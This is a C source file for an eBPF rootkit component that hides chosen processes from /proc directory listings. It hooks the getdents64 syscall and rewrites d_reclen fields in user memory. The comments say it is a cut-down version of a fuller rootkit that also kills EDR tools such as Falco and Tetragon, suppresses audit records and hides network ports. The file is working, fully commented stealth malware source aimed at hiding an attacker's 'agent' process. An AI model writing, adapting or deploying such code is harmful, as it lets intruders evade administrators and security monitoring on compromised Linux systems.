/*
 * hide_proc.bpf.c — Standalone eBPF process hider (getdents64 only)
 *
 * ── Purpose and relationship to bpf_rootkit.bpf.c ───────────────────
 * This file is a SIMPLER, STANDALONE version that implements ONLY the process
 * hiding feature (suppressing /proc/<PID> entries from directory listings).
 *
 * It does NOT include:
 *   - Network port hiding (/proc/net/udp, SOCK_DIAG)
 *   - /proc/self/maps memfd hiding
 *   - bpftool self-hiding
 *   - EDR killing (Tetragon/Falco blocker, execve kill hook)
 *   - readlinkat /proc/PID/exe patching
 *   - AUDIT record suppression
 *
 * Use cases for this file vs. the full rootkit:
 *   - Development/testing: verify the process hiding logic in isolation
 *   - Minimal footprint: deploy only process hiding without network artifacts
 *   - Debugging: fewer hooks = easier to verify with bpftool
 *
 * The core algorithm is IDENTICAL to hooks [1/14] and [2/14] in bpf_rootkit.bpf.c:
 *   1. sys_enter_getdents64: save the userspace dirent buffer pointer
 *   2. sys_exit_getdents64: walk the buffer, hide PID entries via d_reclen merge
 *
 * See bpf_rootkit.bpf.c for detailed comments on the hiding technique.
 *
 * Compile:
 *   clang -O2 -target bpf -I/usr/include \
 *         -D__TARGET_ARCH_x86 \
 *         -c hide_proc.bpf.c -o hide_proc.bpf.o
 */
#include <linux/bpf.h>
#include <stdint.h>

typedef uint8_t  u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;
typedef int64_t  s64;
typedef int32_t  s32;

/* ── Section attribute ───────────────────────────────────────────────────
 * SEC("tracepoint/syscalls/sys_enter_getdents64") places the following
 * function into a named ELF section. The BPF loader reads section names to
 * know which tracepoint to attach each program to. */
#define SEC(name) __attribute__((section(name), used))
/* __always_inline: avoid function calls in BPF (stack limit = 512 bytes) */
#define __always_inline __attribute__((always_inline))

/* ── BPF helper function pointers ───────────────────────────────────────
 * BPF programs cannot call arbitrary kernel functions. They use a fixed set
 * of "helpers" identified by integer IDs (BPF_FUNC_*). We declare them as
 * function pointers cast from the integer ID — the JIT compiler resolves them.
 * See bpf_rootkit.bpf.c for a full explanation of each helper.
 *
 * This file only uses the minimal set needed for process hiding:
 *   bpf_get_current_pid_tgid : get the current thread's pid_tgid (u64 key)
 *   bpf_map_update_elem      : insert/update a map entry
 *   bpf_map_lookup_elem      : look up a map entry (returns pointer or NULL)
 *   bpf_map_delete_elem      : remove a map entry
 *   bpf_probe_read_kernel    : safely read from kernel memory (for ctx->args[])
 *   bpf_probe_read_user      : safely read from userspace (the dirent buffer)
 *   bpf_probe_write_user     : write to userspace (to patch d_reclen) ← the key primitive
 */
static u64   (*bpf_get_current_pid_tgid)(void)
    = (void *)BPF_FUNC_get_current_pid_tgid;
static long  (*bpf_map_update_elem)(void *map, const void *key, const void *val, u64 flags)
    = (void *)BPF_FUNC_map_update_elem;
static void *(*bpf_map_lookup_elem)(void *map, const void *key)
    = (void *)BPF_FUNC_map_lookup_elem;
static long  (*bpf_map_delete_elem)(void *map, const void *key)
    = (void *)BPF_FUNC_map_delete_elem;
static long  (*bpf_probe_read_kernel)(void *dst, u32 size, const void *unsafe_ptr)
    = (void *)BPF_FUNC_probe_read_kernel;
static long  (*bpf_probe_read_user)(void *dst, u32 size, const void *unsafe_ptr)
    = (void *)BPF_FUNC_probe_read_user;
static long  (*bpf_probe_write_user)(void *unsafe_ptr, const void *src, u32 size)
    = (void *)BPF_FUNC_probe_write_user;

/* ── Map definitions (old-style, no BTF/libbpf) ──────────────────────────
 * A BPF map is a key-value store shared between the kernel BPF program and
 * userspace. This file uses only two maps (vs ~8 in the full rootkit).
 */
struct bpf_map_def {
    unsigned int type;
    unsigned int key_size;
    unsigned int value_size;
    unsigned int max_entries;
    unsigned int map_flags;
};

/* pid_buf_map: thread-local scratch space for the dirent buffer pointer.
 * Written by sys_enter_getdents64 (before syscall) with the buffer address.
 * Read by sys_exit_getdents64 (after syscall) to walk and patch the buffer.
 * Key: pid_tgid (u64 = unique thread identifier)
 * Value: userspace pointer to the getdents64 output buffer (u64) */
struct bpf_map_def SEC("maps") pid_buf_map = {
    .type        = BPF_MAP_TYPE_HASH,
    .key_size    = sizeof(u64),   /* pid_tgid */
    .value_size  = sizeof(u64),   /* userspace dirent64 buffer pointer */
    .max_entries = 1024,          /* max concurrent getdents64 calls */
};

/* pids_to_hide: the set of PIDs to suppress from /proc listings.
 * Populated by the USERSPACE agent (via bpf() BPF_MAP_UPDATE_ELEM).
 * Read by the kernel BPF program on every getdents64 exit.
 * Key: PID (u32), Value: u8 flag (1 = hide) */
struct bpf_map_def SEC("maps") pids_to_hide = {
    .type        = BPF_MAP_TYPE_HASH,
    .key_size    = sizeof(u32),   /* PID to hide */
    .value_size  = sizeof(u8),    /* 1 = hide this PID */
    .max_entries = 64,            /* max 64 hidden PIDs at once */
};

/* ── Tracepoint context layouts (from kernel tracefs format files) ───────
 * Each tracepoint program receives a pointer to a context struct that mirrors
 * the trace_event_raw_sys_enter / trace_event_raw_sys_exit kernel structures.
 * The exact byte offsets are defined by the kernel and visible at:
 *   /sys/kernel/tracing/events/syscalls/sys_enter_getdents64/format
 *
 * sys_enter_getdents64 context layout:
 *   u64 pad      (8 bytes): common_* fields (trace event type, preempt, pid...)
 *   long id      (8 bytes): syscall number (__NR_getdents64 = 217 on x86-64)
 *   u64 args[6]  (48 bytes): the 6 syscall arguments:
 *     args[0] = fd        (the directory file descriptor being read)
 *     args[1] = dirent    (userspace pointer to the output buffer)
 *     args[2] = count     (size of the output buffer in bytes)
 *     args[3..5] = unused for getdents64
 *
 * sys_exit_getdents64 context layout:
 *   u64 pad      (8 bytes): same common fields
 *   long id      (8 bytes): syscall number
 *   long ret     (8 bytes): return value (bytes written to the buffer, or -errno)
 *
 * IMPORTANT: We must use bpf_probe_read_kernel() to read from ctx — we cannot
 * dereference ctx->args[] directly because the BPF verifier treats ctx as an
 * opaque pointer and requires helper functions for safe kernel memory access.
 */
struct sys_enter_ctx {
    u64 pad;
    long id;
    u64 args[6];  /* args[0]=fd, args[1]=dirent_ptr, args[2]=count */
};

struct sys_exit_ctx {
    u64 pad;
    long id;
    long ret;  /* bytes written (>0 on success), 0 if empty dir, -errno on error */
};

/* ── linux_dirent64 (kernel structure layout) ────────────────────────────
 * This struct describes ONE entry in the dirent64 buffer filled by getdents64.
 * The buffer is a contiguous array of variable-length entries:
 *   [dirent64_0][dirent64_1][dirent64_2]...
 * Each entry starts with the fixed header defined here, followed by d_name[].
 *
 * To walk the array: start at offset 0, advance by d_reclen to reach next entry.
 * To hide an entry: write (prev_entry.d_reclen += this_entry.d_reclen)
 *   → the walker jumps from prev_entry to the entry AFTER the hidden one.
 *
 * Byte layout at each entry:
 *   offset  0: d_ino    (u64, 8 bytes) — inode number
 *   offset  8: d_off    (s64, 8 bytes) — offset to next entry (directory cookie)
 *   offset 16: d_reclen (u16, 2 bytes) — ← CRITICAL: total size of this entry
 *   offset 18: d_type   (u8,  1 byte)  — DT_DIR=4, DT_REG=8, DT_LNK=10, etc.
 *   offset 19: d_name[] (variable)     — null-terminated entry name
 */
struct dirent64_hdr {
    u64 d_ino;      /* 8 bytes, offset 0  */
    s64 d_off;      /* 8 bytes, offset 8  */
    u16 d_reclen;   /* 2 bytes, offset 16 — total entry size in bytes */
    u8  d_type;     /* 1 byte,  offset 18 — file type */
    /* char d_name[] starts at offset 19 */
};
#define DIRENT64_NAME_OFF 19  /* byte offset of d_name[] within dirent64 */

/* ── name_to_pid: parse ASCII decimal directory name to a PID number ─────
 * In /proc, process directories are named by their PID: "1", "1234", "99999".
 * Non-PID entries have names like "net", "self", "tty", "bus" — letters.
 * This function returns the numeric PID if the name is all-digits, or 0 if
 * the name contains any non-digit character (meaning it's not a PID entry).
 *
 * Why #pragma unroll?
 *   The eBPF verifier requires ALL loops to be statically bounded (termination
 *   must be provable at load time). By asking clang to unroll this 8-iteration
 *   loop, we eliminate the loop entirely — the verifier sees a sequence of
 *   8 independent conditional blocks with no back edges.
 *
 * The limit of 8 iterations covers PIDs up to 99999999 (8 digits). Linux's
 * max PID by default is 4194304 (7 digits), so 8 is sufficient with margin.
 */
static __always_inline u32 name_to_pid(const char *name, int len)
{
    u32 pid = 0;
    int valid = 1;

    #pragma unroll
    for (int i = 0; i < 8; i++) {
        if (i >= len) break;
        char c = name[i];
        if (c == '\0') break;              /* end of name string */
        if (c < '0' || c > '9') { valid = 0; break; }  /* non-digit = not a PID */
        pid = pid * 10 + (u32)(c - '0');  /* decimal accumulation */
    }
    return valid ? pid : 0;  /* 0 means "not a PID name" */
}

/* ═══════════════════════════════════════════════════════════════════════
 * HOOK 1/2: sys_enter_getdents64
 *
 * Fires: at the START of every getdents64() syscall (before the kernel
 *        fills the buffer with directory entries).
 *
 * Goal:  Save the userspace dirent64 buffer pointer so HOOK 2 can find it.
 *
 * Why not do the hiding here?
 *   Because the buffer is EMPTY at this point — the kernel has not yet read
 *   the directory and filled the entries. We can only inspect/modify the
 *   results AFTER the syscall completes (in the exit hook).
 * ═══════════════════════════════════════════════════════════════════════ */
SEC("tracepoint/syscalls/sys_enter_getdents64")
int tp_enter_getdents64(struct sys_enter_ctx *ctx)
{
    u64 pid_tgid = bpf_get_current_pid_tgid();  /* unique thread key */

    /* args[1] = the userspace buffer pointer for dirent64 entries.
     * We must use bpf_probe_read_kernel even for ctx fields
     * (the verifier treats ctx as untyped kernel memory). */
    u64 buf_ptr = 0;
    bpf_probe_read_kernel(&buf_ptr, sizeof(buf_ptr), &ctx->args[1]);

    /* Save it — will be consumed by the exit hook for this thread */
    bpf_map_update_elem(&pid_buf_map, &pid_tgid, &buf_ptr, BPF_ANY);
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════
 * HOOK 2/2: sys_exit_getdents64
 *
 * Fires: at the END of every getdents64() syscall (the kernel has filled
 *        the buffer and is about to return to the calling process).
 *
 * Goal:  Walk the dirent64 buffer and hide entries matching PIDs in pids_to_hide.
 *
 * Algorithm (d_reclen absorb / "merge"):
 *   For each entry in the buffer (up to 128 — BPF verifier limit):
 *     1. Read the fixed-size header (d_ino, d_off, d_reclen, d_type) from userspace
 *     2. Read 8 bytes of d_name
 *     3. Call name_to_pid() to check if the name is a pure digit string (a PID)
 *     4. If PID is in pids_to_hide AND we have a previous entry:
 *          → Write prev_entry.d_reclen += this_entry.d_reclen to userspace
 *          → Skip updating prev_* (the hidden entry is now "part of" the previous)
 *        If it's the very first entry (prev_reclen_off == 0): we can't hide it
 *        without shifting the buffer. In practice /proc sorts by PID numerically,
 *        so PID 1 (init/systemd) is first — our agent's PID is almost never first.
 *     5. If not hidden: remember this entry's d_reclen position, advance.
 *
 * After the exit hook returns, the kernel passes the (now-patched) buffer to
 * the calling userspace process (ps, ls, etc.). The hidden entries' bytes are
 * still in memory but will never be visited by the directory walker.
 * ═══════════════════════════════════════════════════════════════════════ */
SEC("tracepoint/syscalls/sys_exit_getdents64")
int tp_exit_getdents64(struct sys_exit_ctx *ctx)
{
    u64 pid_tgid = bpf_get_current_pid_tgid();

    long ret = 0;
    bpf_probe_read_kernel(&ret, sizeof(ret), &ctx->ret);

    if (ret <= 0) {
        /* Syscall failed or returned empty buffer — no entries to patch.
         * Still clean up the map to avoid a stale entry. */
        bpf_map_delete_elem(&pid_buf_map, &pid_tgid);
        return 0;
    }

    /* Retrieve the buffer pointer saved by the enter hook */
    u64 *pbuf = bpf_map_lookup_elem(&pid_buf_map, &pid_tgid);
    if (!pbuf) return 0;         /* shouldn't happen, but be defensive */
    u64 buf_ptr = *pbuf;
    bpf_map_delete_elem(&pid_buf_map, &pid_tgid);  /* consume the saved pointer */

    /* ── Walk the dirent64 buffer ────────────────────────────────────── */
    u64 offset          = 0;    /* current byte position in the buffer */
    u64 prev_reclen_off = 0;    /* userspace address of d_reclen of the previous entry */
    u16 prev_reclen     = 0;    /* value of d_reclen of the previous entry */

    /* 128 iteration cap satisfies the BPF verifier's bounded loop requirement.
     * /proc rarely has more than ~100 entries (one per running process). */
    for (int i = 0; i < 128; i++) {

        if (offset >= (u64)ret) break;  /* consumed all bytes returned by syscall */

        /* Read this entry's fixed-size header from userspace memory.
         * bpf_probe_read_user() is required — direct dereference of userspace
         * pointers is not allowed in BPF (would bypass the verifier). */
        struct dirent64_hdr hdr = {};
        if (bpf_probe_read_user(&hdr, sizeof(hdr),
                (void *)(buf_ptr + offset)) != 0) break;
        /* Sanity check: d_reclen must be at least sizeof(header) */
        if (hdr.d_reclen == 0 || hdr.d_reclen < sizeof(hdr)) break;

        /* Read up to 8 bytes of the entry name (d_name starts at offset 19).
         * PID up to 9999999 = 7 digits, 8 bytes including potential null. */
        char name[8] = {};
        bpf_probe_read_user(name, sizeof(name),
                (void *)(buf_ptr + offset + DIRENT64_NAME_OFF));

        /* Try to parse the name as a decimal PID */
        u32 pid = name_to_pid(name, 8);

        if (pid > 0) {
            u8 *hide = bpf_map_lookup_elem(&pids_to_hide, &pid);
            if (hide && *hide) {
                /* PID is in our hide list.
                 * Absorb this entry into the previous one if possible. */
                if (prev_reclen_off > 0) {
                    /* Expand the previous entry's d_reclen to skip this one */
                    u16 new_reclen = prev_reclen + hdr.d_reclen;
                    bpf_probe_write_user(
                        (void *)(buf_ptr + prev_reclen_off),  /* &prev.d_reclen */
                        &new_reclen, sizeof(new_reclen));
                    /* Advance past the hidden entry WITHOUT updating prev_*
                     * (the hidden entry is now swallowed into the previous one) */
                    offset += hdr.d_reclen;
                    continue;  /* don't update prev_reclen_off / prev_reclen */
                }
                /* else: first entry — cannot hide, continue normally */
            }
        }

        /* This entry is visible — remember its d_reclen field location */
        prev_reclen_off = offset + 16;   /* offsetof(dirent64_hdr, d_reclen) = 16 */
        prev_reclen     = hdr.d_reclen;
        offset         += hdr.d_reclen;  /* advance to next entry */
    }

    return 0;
}

char LICENSE[] SEC("license") = "GPL";
